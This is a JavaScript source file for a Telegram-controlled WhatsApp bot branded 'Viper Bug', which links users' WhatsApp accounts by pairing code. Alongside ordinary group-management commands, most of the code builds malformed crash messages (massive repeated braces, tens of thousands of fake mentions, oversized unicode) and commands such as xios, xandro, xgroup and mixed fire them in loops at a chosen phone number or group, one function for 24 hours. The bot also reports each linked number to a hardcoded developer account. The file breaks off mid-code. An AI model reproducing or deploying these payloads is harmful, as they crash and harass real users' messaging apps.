const { makeWASocket, getContentType, useMultiFileAuthState, fetchLatestBaileysVersion, Browsers, makeCacheableSignalKeyStore, DisconnectReason, generateWAMessageFromContent, relayMessage } = require("@fizzxydev/baileys-pro");
const TelegramBot = require('node-telegram-bot-api');
const NodeCache = require('node-cache');
const pino = require('pino');
const axios = require('axios');
const path = require('path');
const util = require('util');
const chalk = require('chalk');
const { exec } = require('child_process');
const fs = require('fs');
const speed = require("performance-now")
const moment = require("moment-timezone");
const crypto = require('crypto')


const startTime = Date.now();
const settings = require("./config.json")
const BOT_TOKEN = settings.BOT_TOKEN;
let OWNER_ID = settings.OWNER_ID
const bot = new TelegramBot(BOT_TOKEN, { polling: true });
const pairingCodes = new NodeCache({ stdTTL: 3600, checkperiod: 600 });
const requestLimits = new NodeCache({ stdTTL: 120, checkperiod: 60 });
let connectedUsers = {};
const developer = '2349052729951@s.whatsapp.net';
const connectedUsersFilePath = path.join(__dirname, 'pairedUsers.json');
const { smsg } = require("./lib/myfunc")
const CHANNEL_USERNAME = '@gabimarutechchannel';
const OWNER_FILE = path.join(__dirname, 'telegramowners.json');

if (!fs.existsSync(OWNER_FILE)) {
    fs.writeFileSync(OWNER_FILE, JSON.stringify([]));
}

function isOwner(userId) {
    const owners = JSON.parse(fs.readFileSync(OWNER_FILE));
    return owners.includes(userId.toString());
}
async function userFollowsChannel(userId, bot) {
    try {
        const chatMember = await bot.getChatMember(CHANNEL_USERNAME, userId);
        return ['member', 'administrator', 'creator'].includes(chatMember.status);
    } catch (err) {
        console.error('❌ Error checking channel membership:', err);
        return false;
    }
}
const formatTime = (seconds) => {
  seconds = Number(seconds);
  const d = Math.floor(seconds / (3600 * 24));
  const h = Math.floor((seconds % (3600 * 24)) / 3600);
  const m = Math.floor((seconds % 3600) / 60);
  const s = Math.floor(seconds % 60);
  const dDisplay = d > 0 ? `${d} ${d === 1 ? 'day, ' : 'days, '}` : '';
  const hDisplay = h > 0 ? `${h} ${h === 1 ? 'hour, ' : 'hours, '}` : '';
  const mDisplay = m > 0 ? `${m} ${m === 1 ? 'minute, ' : 'minutes, '}` : '';
  const sDisplay = s > 0 ? `${s} ${s === 1 ? 'second' : 'seconds'}` : '';
  return `${dDisplay}${hDisplay}${mDisplay}${sDisplay}`;
};


// Load connected users from the JSON file
function loadConnectedUsers() {
    if (fs.existsSync(connectedUsersFilePath)) {
        const data = fs.readFileSync(connectedUsersFilePath);
        connectedUsers = JSON.parse(data);
    }
}

// Save connected users to the JSON file
function saveConnectedUsers() {
    fs.writeFileSync(connectedUsersFilePath, JSON.stringify(connectedUsers, null, 2));
}

let isFirstLog = true;

async function startWhatsAppBot(phoneNumber, telegramChatId = null) {
    const sessionPath = path.join(__dirname, 'tmp', `session_${phoneNumber}`);

    if (!fs.existsSync(sessionPath)) {
        console.log(`Session not found for ${phoneNumber}.`);
        return;
    }

    let { version, isLatest } = await fetchLatestBaileysVersion();
    if (isFirstLog) {
        console.log(`Using Baileys version: ${version} (Latest: ${isLatest})`);
        isFirstLog = false;
    }

    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const msgRetryCounterCache = new NodeCache();
    const conn = makeWASocket({
        logger: pino({ level: 'silent' }),
        printQRInTerminal: false,
        browser: Browsers.windows('Firefox'),
        auth: {
            creds: state.creds,
            keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        markOnlineOnConnect: true,
        generateHighQualityLinkPreview: true,
        msgRetryCounterCache,
        defaultQueryTimeoutMs: undefined,
    });

    if (conn.authState.creds.registered) {
        await saveCreds();
        console.log(`Reloaded Creds For ${phoneNumber}!`);
    } else {

        if (telegramChatId) {
            setTimeout(async () => {
                const custom = "GABIMARU";
                let code = await conn.requestPairingCode(phoneNumber, custom);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                pairingCodes.set(code, { count: 0, phoneNumber });
                const pairText = `
PAIRING CODE -> \`${code}\`

🔗 **Instructions:**
1. 🧭 Open *WhatsApp* on your phone.
2. 📲 Tap the **three dots** (menu) in the top right corner.
3. 💻 Select **Linked Devices**.
4. ➕ Tap on **Link a Device**.
5. 🔤 You'll see a prompt to scan a QR — instead, *tap the "Link with phone number instead"* option.
7. 🧩 Enter the pairing code you received: **${code}**
8. ✅ Done! Your WhatsApp is now linked to the bot.

If you need a new code, \`/delpair <number>\` then request one again!

_— Powered by Gabimaru Bot 🐉_
`;
                bot.sendMessage(telegramChatId, pairText, { parse_mode: 'Markdown' });
                console.log(`Use \`${code}\` to link your WhatsApp to the WhatsApp bot.`);
            }, 3000);
        }
    }
    conn.public = true
    conn.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
            await saveCreds();
            console.log(`Credentials saved successfully for ${phoneNumber}!`);

            if (telegramChatId) {
                if (!connectedUsers[telegramChatId]) {
                    connectedUsers[telegramChatId] = [];
                }
                                connectedUsers[telegramChatId].push({ phoneNumber, connectedAt: startTime });
                saveConnectedUsers();
                bot.sendMessage(telegramChatId, `Connection to ${phoneNumber} has been secured. ✅`)
		console.log(`
Connection to ${phoneNumber} has been secured. ✅`);
            }

            try {
                await conn.sendMessage(developer, { text: `Connection to ${phoneNumber} has been secured. ✅` });
            } catch (error) {
                console.error('Error sending message to admin:', error);
            }
        } else if (connection === 'close') {
            if (lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut) {
                console.log(`Session closed for ${phoneNumber}. Attempting to restart...`);
                startWhatsAppBot(phoneNumber, telegramChatId);
            }
        }
    });

    conn.ev.on('creds.update', saveCreds);

conn.ev.on('messages.upsert', async ({ messages, type }) => {
    try {
        if (type !== 'notify' || !messages || !messages[0]) return;

        const msg = messages[0];
        if (!msg.message || msg.key.remoteJid === 'status@broadcast') return;

        const fromMe = msg.key.fromMe;
        if (!conn.public && !fromMe) return;

        // Handle ephemeral messages
        msg.message = msg.message?.ephemeralMessage?.message || msg.message;
        const m = smsg(JSON.parse(JSON.stringify(msg)), conn);
        const typeMsg = getContentType(msg.message);
        const chat = msg.key.remoteJid;
        const isGroup = chat.endsWith('@g.us');

        const body = (
            typeMsg === 'conversation' ? msg.message.conversation :
            typeMsg === 'imageMessage' ? msg.message.imageMessage.caption :
            typeMsg === 'videoMessage' ? msg.message.videoMessage.caption :
            typeMsg === 'extendedTextMessage' ? msg.message.extendedTextMessage.text :
            typeMsg === 'buttonsResponseMessage' ? msg.message.buttonsResponseMessage.selectedButtonId :
            typeMsg === 'listResponseMessage' ? msg.message.listResponseMessage.singleSelectReply.selectedRowId :
            ''
        )?.trim() || '';

        const prefix = settings.prefix || '.';
        const isCmd = body.startsWith(prefix);
        const command = isCmd ? body.slice(prefix.length).trim().split(' ')[0].toLowerCase() : '';
        const args = body.trim().split(/\s+/).slice(1);
        const q = args.join(' ');

        const sender = msg.key.fromMe ? conn.user.id : (msg.key.participant || msg.key.remoteJid);
        const senderNumber = sender.split('@')[0];
        const botNumber = conn.user.id.split(':')[0] + '@s.whatsapp.net';
        const pushname = msg.pushName || 'Unknown';

        // Styled message logs
        console.log(
            chalk.greenBright('📩 New Message:'),
            chalk.cyan(`${pushname} (${senderNumber})`),
            chalk.yellow(isGroup ? `[GROUP: ${chat.split('@')[0]}]` : `[PRIVATE]`),
            chalk.magentaBright(isCmd ? `>> ${command}` : `>> ${body.slice(0, 30)}...`)
        );

        // Owner check
        const ownerList = JSON.parse(fs.readFileSync('./developers.json'));
        const isCreator = [botNumber, ...ownerList.map(n => `${n.replace(/\D/g, '')}@s.whatsapp.net`)].includes(sender);

        // Group info
        let groupMetadata = {}, groupAdmins = [];
        if (isGroup) {
            groupMetadata = await conn.groupMetadata(chat).catch(() => ({}));
            groupAdmins = Array.isArray(groupMetadata.participants)
                ? groupMetadata.participants.filter(p => p.admin).map(p => p.id)
                : [];
        }

        const cleanSender = sender.split(':')[0] + '@s.whatsapp.net';
        const isAdmin = groupAdmins.includes(sender) || groupAdmins.includes(cleanSender);
        const isBotAdmin = groupAdmins.includes(botNumber);

        // Helper functions
 async function poveius24jam(conn, targetJid) {
  const mentions = [
    "0@s.whatsapp.net",
    ...Array.from({ length: 40000 }, () =>
      "1" + `${Math.floor(Math.random() * 999999)}@s.whatsapp.net`
    )
  ];

  const payload = {
    viewOnceMessage: {
      message: {
        videoMessage: {
          url: "https://mmg.whatsapp.net/d/f/Aq+PoveiusDelay.mp4?auth=1",
          mimetype: "video/mp4",
          caption: "Poveius",
          fileName: "poveius_burst.mp4",
          fileLength: "999999999",
          seconds: "9999",
          mediaKey: Buffer.from("dd0d5608ca9ada5538a1e1ab4ee8904823cebc3cae269b844ec6c85400c64a37", "hex"),
          fileEncSha256: Buffer.from("83e1e439c1f43d2703655dcdcc9e80cf42a6fb80b66854dc55e1ead89fca7381", "hex"),
          fileSha256: Buffer.from("6e993d35b1ca1c06878b8df0f206e218dbc41ac33bd6849c32c09de6cdd97e03", "hex"),
          mediaKeyTimestamp: "999999",
          jpegThumbnail: Buffer.alloc(0)
        },
        contextInfo: {
          mentionedJid: mentions,
          quotedMessage: {
            extendedTextMessage: {
              text: "\u0000",
              contextInfo: {
                quotedMessage: {
                  nativeFlowMessage: {
                    messageParamsJson: "{".repeat(100000)
                  }
                }
              }
            }
          }
        }
      }
    }
  };

  const endTime = Date.now() + 24 * 60 * 60 * 1000;
  while (Date.now() < endTime) {
    try {
      await conn.relayMessage(targetJid, payload, {});
      await new Promise(r => setTimeout(r, 5000));
    } catch (_) {}
  }
}
async function newfc(target) {
  const cards = [];

  const media = await prepareWAMessageMedia(
    { video: { url: "https://files.catbox.moe/3uk8b9.mp4" } },
    { upload: conn.waUploadToServer }
  );

  const header = {
    videoMessage: media.videoMessage,
    hasMediaAttachment: false,
    contextInfo: {
      forwardingScore: 666,
      isForwarded: true,
      stanzaId: "𝕷" + Date.now(),
      participant: "0@s.whatsapp.net",
      remoteJid: "status@broadcast",
      quotedMessage: {
        extendedTextMessage: {
          text: "𝕷",
          contextInfo: {
            mentionedJid: ["13135550002@s.whatsapp.net"],
            externalAdReply: {
              title: "Finix AI Broadcast",
              body: "Trusted System",
              thumbnailUrl: "",
              mediaType: 1,
              sourceUrl: "https://tama.example.com",
              showAdAttribution: false 
            }
          }
        }
      }
    }
  };

  for (let r = 0; r < 15; r++) {
    cards.push({
      header,
      nativeFlowMessage: {
        messageParamsJson: "{".repeat(10000) 
      }
    });
  }

  const msg = generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            body: {
              text: "𝕷"
            },
            carouselMessage: {
              cards,
              messageVersion: 1
            },
            contextInfo: {
              businessMessageForwardInfo: {
                businessOwnerJid: "13135550002@s.whatsapp.net"
              },
              stanzaId: "𝕷" + "-Id" + Math.floor(Math.random() * 99999), 
              forwardingScore: 100,
              isForwarded: true,
              mentionedJid: ["13135550002@s.whatsapp.net"],
              externalAdReply: {
                title: "Finix Engine",
                body: "",
                thumbnailUrl: "https://example.com/",
                mediaType: 1,
                mediaUrl: "",
                sourceUrl: "https://finix-ai.example.com",
                showAdAttribution: false
              }
            }
          }
        }
      }
    },
    {}
  );

  await conn.relayMessage(target, msg.message, {
    participant: { jid: target },
    messageId: msg.key.id
  });
}
async function xc(target) {
   
  await conn.relayMessage(target, {
    contactMessage: {
      displayName: "~ 𝕶𝖎𝖓𝖌 𝐆͠𝐚𝐛͠𝐢𝐦𝐚͠𝐫͜𝐮 ~" + "𑇂𑆵𑆴𑆿".repeat(60000),
      vcard:` BEGIN:VCARD
      VERSION:3.0
      N:~ 𝕶𝖎𝖓𝖌 𝐆͠𝐚𝐛͠𝐢𝐦𝐚͠𝐫͜𝐮 ~
      FN:~ 𝕶𝖎𝖓𝖌 𝐆͠𝐚𝐛͠𝐢𝐦𝐚͠𝐫͜𝐮 ~
      item1.TEL;waid=+5521992999999:5521992999999
      item4.ADR:;;Brasil, AM, SP;;;;
      X-WA-BIZ-DESCRIPTION: JohnleoSm1th Mp4
      X-WA-BIZ-NAME: KING SAM Mp5      
      END:VCARD`,
      contextInfo: {
        forwardingScore: 2,
        isForwarded: true,
        isFromMe: true,
        externalAdReply: {
        title: "@ You have been mentioned",
        body: "@ You have been mentioned",
        mediaType: "VIDEO",
        renderLargerThumbnail: true,
        previewTtpe: "VIDEO",
        thumbnailUrl: "https://files.catbox.moe/4sdoxu.jpg",
        sourceType: " x ",
        sourceId: " x ",
        sourceUrl: "https://youtube.com/@JohnleoSm1th?si=LoOB7Mbumd1uXSzL",
        mediaUrl: "https://youtube.com/@JohnleoSm1th?si=LoOB7Mbumd1uXSzL",
        containsAutoReply: true,
        renderLargerThumbnail: true,
        showAdAttribution: true,
        ctwaClid: "ctwa_clid_example",
        ref: "ref_example"
        },       
        quotedMessage: {
            message: {
                text: "AyoKunle",
                footer: "XxX",
                buttons: [{
                    buttonId: "🚀", 
                    buttonText: {
                        displayText: '\u0000'.repeat(50000)
                    },
                    type: 1 
                }],
                headerType: 1,
                viewOnce: false
          }
        }
      }
    }
  }, {
    participant: { jid: target }
  });
}
async function InvisibleFC(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "⏤🤡⃟‌𝗧.𝗥.𝗔.𝗦.𝗛⃟⏤‌‌@ayokunledavid",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -999.035,
                degreesLongitude: 922.999999999999,
                name: "⏤🤡⃟‌𝗧.𝗥.𝗔.𝗦.𝗛⃟⏤‌‌@ayokunledavid",
                address: "\u200D",
              },
            },
            body: {
              text: "⏤🤡⃟‌𝗧.𝗥.𝗔.𝗦.𝗛⃟⏤‌‌@ayokunledavid",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(1000000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: ["0@s.whatsapp.net"],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
async function VanitasFC(target) {
  try {
    let message = {
      ephemeralMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "AyoKunle",
              hasMediaAttachment: false,
              locationMessage: {
                degreesLatitude: -6666666666,
                degreesLongitude: 6666666666,
                name: "𝖵𝗂𝗉𝖾𝗋 𝖡𝗎𝗀",
                address: "𝖦𝖺𝖻𝗂𝗆𝖺𝗋𝗎",
              },
            },
            body: {
              text: "𝖵𝗂𝗉𝖾𝗋 𝖷 𝖡𝗎𝗀",
            },
            nativeFlowMessage: {
              messageParamsJson: "{".repeat(10000),
            },
            contextInfo: {
              participant: target,
              mentionedJid: [
                "0@s.whatsapp.net",
                ...Array.from(
                  {
                    length: 30000,
                  },
                  () =>
                    "1" +
                    Math.floor(Math.random() * 5000000) +
                    "@s.whatsapp.net"
                ),
              ],
            },
          },
        },
      },
    };

    await conn.relayMessage(target, message, {
      messageId: null,
      participant: { jid: target },
      userJid: target,
    });
  } catch (err) {
    console.log(err);
  }
}
async function FlowXNull(target) {
  const MSG = {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "⛧ 𝐆͠𝐚𝐛͠𝐢𝐦𝐚͠𝐫͜𝐮 ⛧  \n" + 
                 "@0@1".repeat(30000),
            format: "DEFAULT",
            contextInfo: {
              mentionedJid: [
                target,
                "0@s.whatsapp.net",
                ...Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              ],
              disappearingMode: {
                initiator: "CHANGED_IN_CHAT",
                trigger: "CHAT_SETTING"
              },
            }
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message", // can changed to "call_permission_request" 
            paramsJson: "{".repeat(50000) + "}".repeat(50000), 
            version: 3
          }
        }
      }
    }
  };

  await conn.relayMessage(target, MSG, {
    participant: { jid: target }
  });
}
   async function ultimateBug(target, ptcp = true) {
    let mentions = Array(5000).fill("6283871656842@s.whatsapp.net");

    let messagePayload = {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "🔥 VIPER WA CRASH 🔥",
                        hasMediaAttachment: true
                    },
                    body: {
                        text: "⚠️ WARNING: LAG INCOMING ⚠️\n" + "𓆩𓆪".repeat(50000),
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "{}",
                        buttons: [
                            {
                                name: "cta_url",
                                buttonParamsJson: "{\"url\":\"https://t.me/ayokunledavid\"}"
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "{\"request\":\"permission\"}"
                            }
                        ]
                    }
                },
                documentMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                    mimetype: "application/pdf",
                    fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                    fileLength: "9999999999999",
                    pageCount: 999999,
                    mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                    fileName: "💀 VIPER WA CRASH 💀",
                    fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                    directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc",
                    mediaKeyTimestamp: "1735456100",
                    contactVcard: true,
                    caption: "📌 *WA STRESS TEST* 📌"
                },
                extendedTextMessage: {
                    text: "🚀 SYSTEM OVERLOAD 🚀\n" + mentions.join(" "),
                    contextInfo: {
                        mentionedJid: mentions
                    }
                }
            }
        }
    };

    await conn.relayMessage(target, messagePayload, {
        participant: { jid: target }
    });

    console.log("Ultimate crash message sent. WhatsApp might force close.");
}
        async function xiosinv(bad, target) {
            tmsg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        listResponseMessage: {
                            title: '𝙺𝚄𝙽𝙻𝙴 𝚇𝙾𝚇𝙾\n',
                            description: "\n\n\n" + "𑪆".repeat(260000),
                            singleSelectReply: {
                                selectedId: "id"
                            },
                            listType: 1
                        }
                    }
                }
            }, {});

            await bad.relayMessage("status@broadcast", tmsg.message, {
                messageId: tmsg.key.id,
                statusJidList: [target],
                additionalNodes: [{
                    tag: "meta",
                    attrs: {},
                    content: [{
                        tag: "mentioned_users",
                        attrs: {},
                        content: [{
                            tag: "to",
                            attrs: { jid: target },
                            content: undefined,
                        }],
                    }],
                }],
            });
        }

        const send = async (text) => conn.sendMessage(chat, { text });
        const xreply = async (text) => conn.sendMessage(chat, {
            text,
            contextInfo: {
                mentionedJid: [sender],
                externalAdReply: {
                    title: "𝐕𝐈𝐏𝐄𝐑 𝐁𝐔𝐆",
                    body: pushname,
                    mediaUrl: "https://t.me/lonelydeveloper",
                    sourceUrl: "https://t.me/gabimarutechchannel",
                    thumbnailUrl: "https://files.catbox.moe/4sdoxu.jpg",
                    showAdAttribution: false
                }
            }
        });

        // Commands
        if (isCmd) {
            switch (command) {
                case 'ping': {
                    const start = speed();
                    const end = speed();
                    return xreply(`
━━━━━━━━━━━━━━━━━
◉ 𝙷𝙴𝙻𝙻𝙾 ${pushname}
━━━━━━━━━━━━━━━━━
◈ 𝐕𝐈𝐏𝐄𝐑 𝐁𝐔𝐆 𝚂𝙿𝙴𝙴𝙳 : ${Math.floor(end - start)} 𝐌𝐒
━━━━━━━━━━━━━━━━━
`);
                }

                case "public": {
                    if (!isCreator) return;
                    xreply("Status has successfully changed to public");
                    conn.public = true;
                    break;
                }

                case "self": {
                    if (!isCreator) return;
                    xreply("Status has successfully changed to private");
                    conn.public = false;
                    break;
                }

                case 'creategc':
                case 'creategroup': {
                    if (!isCreator) return;
                    if (!args.join(" ")) return xreply(`Use ${prefix + command} groupname`);
                    let cret = await conn.groupCreate(args.join(" "), []);
                    let response = await conn.groupInviteCode(cret.id);
                    let capt = `     「 Created Group 」

▸ Name : ${cret.subject}
▸ Owner : @${cret.owner.split("@")[0]}
▸ Creation : ${moment(cret.creation * 1000).tz("Africa/Lagos").format("DD/MM/YYYY HH:mm:ss")}

https://chat.whatsapp.com/${response}`;
                    await conn.sendMessage(chat, { text: capt });
                    break;
                }

                case "subject":
                case "changesubject": {
                    if (!isGroup) return send("This command is only for groups");
                    if (!isBotAdmin) return send("I Need Admin Privileges To Complete This command");
                    if (!isAdmin) return send("Only for admins");
                    if (!q) return send("Provide text for group subject");
                    await conn.groupUpdateSubject(chat, q);
                    xreply('Group name successfully updated!');
                    break;
                }
                
                case 'mute': {
await conn.groupSettingUpdate(chat, 'announcement')
await xreply("Group has been muted");
}
break
case 'unmute': {
await conn.groupSettingUpdate(chat, 'not_announcement')
await xreply("*</> Dᴏɴᴇ </>*");
}
break
case 'lock': {
await conn.groupSettingUpdate(chat, 'locked')
await xreply("Group Editing Locked 🔒");
}
break
case 'unlock': {
await conn.groupSettingUpdate(chat, 'unlocked')
xreply("Group Editing Unlocked 🔒");
}
break
                case "desc":
                case "setdesc": {
                    if (!isGroup) return send("This command is only for groups");
                    if (!isBotAdmin) return send("I Need Admin Privileges To Complete This command");
                    if (!isAdmin) return send("Only for admins");
                    if (!q) return send("Provide text for group description");
                    await conn.groupUpdateDescription(chat, q);
                    xreply(`Group description successfully updated! 👥\n> 𝐆𝐚𝐛𝐢𝐦𝐚𝐫𝐮`);
                    break;
                }

                case "disp-off": {
                    if (!isGroup) return send("This command is only for groups");
                    if (!isBotAdmin) return send("Bot must be admin");
                    if (!isAdmin) return send("Only for admins");
                    await conn.groupToggleEphemeral(chat, 0);
                    xreply('Disappearing messages successfully turned off!');
                    break;
                }

                case "xios": {
                    if (!botNumber) {
                     return xreply("𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖀𝖘𝖊𝖗𝖘 𝕺𝖓𝖑𝖞 𓂃₊ཐི༑ཋྀ˚");
                    } else {
                    if (!q) return send("Usage: `xios 234xxx`");
                    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                    for (let i = 0; i < 5; i++) {   
                        await xc(target);
                        await xc(target);
                        await xc(target);
                        await xc(target);
                        await xc(target);
                    }
                    xreply(`ᥴ᥆mmᥲᥒძ: ${command}.
                    𝗍ᥲrgᥱ𝗍: ${target}.
                    s𝗍ᥲ𝗍ᥙs: WhatsApp user has been neutralized.
                    ᥎і⍴ᥱr ᑲᥙg іs ᥲ 𝗍һrᥱᥲ𝗍 🚡.`);
                    }
                    break;
                }
                case "xandro": {
                    if (!botNumber && !isCreator) {
                     return xreply("𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖀𝖘𝖊𝖗𝖘 𝕺𝖓𝖑𝖞 𓂃₊ཐི༑ཋྀ˚");
                    } else {
                    if (!q) return send("Usage: `xandro 234xxx`");
                    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                    try {
                    for (let i = 0; i < 15; i++) {
                        await VanitasFC(target);
                        await InvisibleFC(target);
                        await newfc(target);
                        await InvisibleFC(target);
                        await VanitasFC(target);
                        await newfc(target);
                        await InvisibleFC(target);
                        await VanitasFC(target);
                        await VanitasFC(target);
                        await InvisibleFC(target);
                        await newfc(target);
                    }
                    xreply(`ᥴ᥆mmᥲᥒძ: ${command}.
                    𝗍ᥲrgᥱ𝗍: ${target}.
                    s𝗍ᥲ𝗍ᥙs: WhatsApp user has been neutralized.
                    ᥎і⍴ᥱr ᑲᥙg іs ᥲ 𝗍һrᥱᥲ𝗍 🚡.`);
                    } catch (err) {
                    send(`An Error Occurred: ${err}`);
                    }
                    }
                    }
                    break;
                    case 'tagall': {
  if (!isGroup) return reply('This command can only be used in groups.');

  try {
    const groupMetadata = await conn.groupMetadata(chat);
    const participants = groupMetadata.participants;
    let mentions = [];
    let text = `Tagging all members:\nMessage: *${q}*\n\n`;

    for (const participant of participants) {
      mentions.push(participant.id);
      text += `@${participant.id.split('@')[0]}\n`;
    }

    conn.sendMessage(chat, { text: text, mentions: mentions });

  } catch (error) {
    console.error("Error in tagall command:", error);
    reply("An error occurred while tagging all members.");
  }
  }
  break;
                    case "xgroup":
                    case "-group": {
                    if (!botNumber && !isCreator) {
                     return xreply("𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖀𝖘𝖊𝖗𝖘 𝕺𝖓𝖑𝖞 𓂃₊ཐི༑ཋྀ˚");
                    } else {
                    if (!isGroup) return send("‼️Gc Crash Bro, Use In A Group");
            await conn.chatModify({ archive: true}, chat);
                    try {
                    for (let i = 0; i < 15; i++) {
                        await VanitasFC(chat);
                        await InvisibleFC(chat);
                        await newfc(chat);
                        await InvisibleFC(chat);
                        await VanitasFC(chat);
                        await newfc(chat);
                        await InvisibleFC(chat);
                        await VanitasFC(chat);
                        await VanitasFC(chat);
                        await InvisibleFC(target);
                        await newfc(chat);
                    }
                    xreply(`
                    gr᥆ᥙ⍴: ${chat} 💥
                    ᥴ᥆mmᥲᥒძ: ${command} 💥
                    gr᥆ᥙ⍴ ᥒᥱᥙ𝗍rᥲᥣіzᥱძ 💥
                    ᥎і⍴ᥱr ᑲᥙg іs ᥲ 𝗍һrᥱᥲ𝗍 💥
                    \`(t.me/ayokunledavid to buy prem) 💥.\``);
                    } catch (err) {
                    send(`An Error Occurred: ${err}`);
                    }
                    }
                    break;
                }
                case "xdelay": {
                    if (!botNumber && !isCreator) {
                     return xreply("𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖀𝖘𝖊𝖗𝖘 𝕺𝖓𝖑𝖞 𓂃₊ཐི༑ཋྀ˚");
                    } else {
                    if (!q) return send("Usage: `xdelay 234xxx`");
                    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                    try {
                    for (let i = 0; i < 10; i++) {
                        await newfc(target);
                        await InvisibleFC(target);
                    }
                    xreply(`ᥴ᥆mmᥲᥒძ: ${command}.
                    𝗍ᥲrgᥱ𝗍: ${target}.
                    s𝗍ᥲ𝗍ᥙs: WhatsApp user has been delayed.
                    ᥎і⍴ᥱr ᑲᥙg іs ᥲ 𝗍һrᥱᥲ𝗍 🚡.`);
                    } catch (err) {
                    send(`An Error Occurred: ${err}`);
                    }
                    }
                    break;
                }
                case "mixed": {
                    if (!botNumber && !isCreator) {
                     return xreply("𝕻𝖗𝖊𝖒𝖎𝖚𝖒 𝖀𝖘𝖊𝖗𝖘 𝕺𝖓𝖑𝖞 𓂃₊ཐི༑ཋྀ˚");
                    } else {
                    if (!q) return send("Usage: `mixed 234xxx`");
                    const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                    try {
                    for (let i = 0; i < 15; i++) {
                        await xc(target);
                        await newfc(target);
                        await newfc(target);
                        await FlowXNull(target);
                        await xc(target);
                        await newfc(target);
                        await FlowXNull(target);
                        await VanitasFC(target);
                        await VanitasFC(target);
                        await newfc(target);
                        await VanitasFC(target);
                        await FlowXNull(target);
                    }
                    xreply(`ᥴ᥆mmᥲᥒძ: ${command}.
                    𝗍ᥲrgᥱ𝗍: ${target}.
                    s𝗍ᥲ𝗍ᥙs: WhatsApp user has been destroyed.
                    ᥎і⍴ᥱr ᑲᥙg іs ᥲ 𝗍һrᥱᥲ𝗍 🚡.`);
                    } catch (err) {
                    send(`An Error Occurred: ${err}`);
                    }
                    }
                    break;
                }

                case 'menu': {
                    const image = "https://files.catbox.moe/yxnsoc.jpg";
                    await conn.sendMessage(chat, {
                        image: { url: image },
                        caption: `
𝗕𝗼𝘁: 𝐕𝐈𝐏𝐄𝐑: 𝐀𝐖𝐀𝐊𝐄𝐍𝐈𝐍𝐆 
𝗗𝗲𝘃: 𝐆𝐚𝐛𝐢𝐦𝐚𝐫𝐮
𝗩𝗲𝗿𝘀𝗶𝗼𝗻: 𝐖𝐡𝐚𝐭𝐗𝐓𝐞𝐥𝐞

𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
.𝗉𝗂𝗇𝗀
.𝗆𝖾𝗇𝗎
.𝖽𝖾𝗌𝖼 [𝗇𝖾𝗐]
.𝗌𝗎𝖻𝗃𝖾𝖼𝗍 [𝗇𝖾𝗐]
.𝗀𝗋𝗈𝗎𝗉𝗅𝗂𝗇𝗄
.𝗄𝗂𝖼𝗄 @user
.𝗍𝖺𝗀𝖺𝗅𝗅

𝗦𝗣𝗘𝗖𝗜𝗔𝗟 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦:
.𝗌𝖾𝗅𝖿
.𝗉𝗎𝖻𝗅𝗂𝖼
.𝗑𝗂𝗈𝗌 𝟤𝟥𝟦𝗑𝗑𝗑
.𝗑𝖺𝗇𝖽𝗋𝗈 𝟤𝟥𝟦𝗑𝗑𝗑
.mixed 234xxx
.-𝗀𝗋𝗈𝗎𝗉 (𝗂𝗇 𝗀𝖼) 
𝖢𝗋𝖾𝖺𝗍𝖾𝖽 𝖻𝗒 ayokunledavid.t.me
`
                    });
                    break;
                }

                case 'kick':
                case 'remove': {
                    if (!q) return send(`Usage: .${command || "kick"} @user`);
                    const jid = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
                    await conn.groupParticipantsUpdate(chat, [jid], 'remove');
                    xreply(`${jid} has successfully been removed`);
                    break;
                }

                case 'group-link':
                case 'gclink': {
                    if (!isGroup) return send("❌ This command is only for groups.");
                    const code = await conn.groupInviteCode(chat);
                    return send(`🔗 Group Link:\nhttps://chat.whatsapp.com/${code}`);
                }

                default:
                    if (isCreator && body.startsWith('=>')) {
                        try {
                            const result = await eval(`(async () => { return ${body.slice(3)} })()`);
                            return send(util.format(result));
                        } catch (e) {
                            return send(String(e));
                        }
                    }

                    if (isCreator && body.startsWith('>')) {
                        try {
                            let evaled = await eval(body.slice(2));
                            if (typeof evaled !== 'string') evaled = util.inspect(evaled);
                            return send(evaled);
                        } catch (err) {
                            return send(String(err));
                        }
                    }

                    if (isCreator && body.startsWith('$')) {
